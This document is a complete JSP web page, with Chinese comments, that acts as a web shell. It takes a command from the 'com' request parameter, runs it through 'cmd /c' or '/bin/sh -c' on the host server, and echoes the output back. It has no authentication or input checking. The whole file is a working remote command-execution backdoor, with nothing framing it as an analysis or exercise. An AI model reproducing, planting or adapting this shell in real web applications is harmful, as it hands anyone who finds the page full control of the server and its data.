<%@ page import="java.io.*" %>
<%@ page language="java" contentType="text/html; charset=UTF-8"
         pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>command</title>
    <script type="text/javascript">
        document.onkeydown=keyDownSearch;

        function keyDownSearch(e) {
            var theEvent = e || window.event;
            var code = theEvent.keyCode || theEvent.which || theEvent.charCode;
            if (code == 13) {
                formRun();
                return false;
            }
            return true;
        }

        function formRun() {
            document.getElementById('formRun').submit();
        }
    </script>
</head>
<body>
    <%--<h3><a href="command.jsp">命令执行</a></h3>--%>
    <%
        String osName = System.getProperty("os.name");
        String com = request.getParameter("com");
        String rs = com;

        if (null == rs) {
            rs = "请在下方输入框输入命令后点击执行(或点击回车)！";
        } else {
            rs = "";
            /* windows */
            if (null != osName && osName.indexOf("indows") > -1) {
                Runtime runtime = Runtime.getRuntime();
                Process process = runtime.exec("cmd /c " + com);
                //取得命令结果的输出流
                InputStream fis = process.getInputStream();
                //用一个读输出流类去读
                BufferedReader br = new BufferedReader(new InputStreamReader(fis));
                String line = null;
                //逐行读取输出到控制台
                while ((line = br.readLine()) != null) {
                    rs += line + "\n";
                }
            } else {
                try {
                    String[] cmdA = { "/bin/sh", "-c", com };
                    Process process = Runtime.getRuntime().exec(cmdA);
                    LineNumberReader br = new LineNumberReader(new InputStreamReader(
                            process.getInputStream()));
                    StringBuffer sb = new StringBuffer();
                    String line;
                    while ((line = br.readLine()) != null) {
                        sb.append(line).append("\n");
                    }
                    rs = sb.toString();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    %>

    <div id="divCom" style="width: 98%; height: 100%;">
        <form id="formRun" action="command.jsp" method="post" >
            <textarea id="txtRs" name="rs" rows="16" cols="80" style="width: 100%;"><%= rs %></textarea>
            <input type="text" id="txtCom" name="com" style="width:95%; font-size: large;" />
            <input type="button" value="Run" onclick="formRun();" />
        </form>
    </div>
</body>
</html>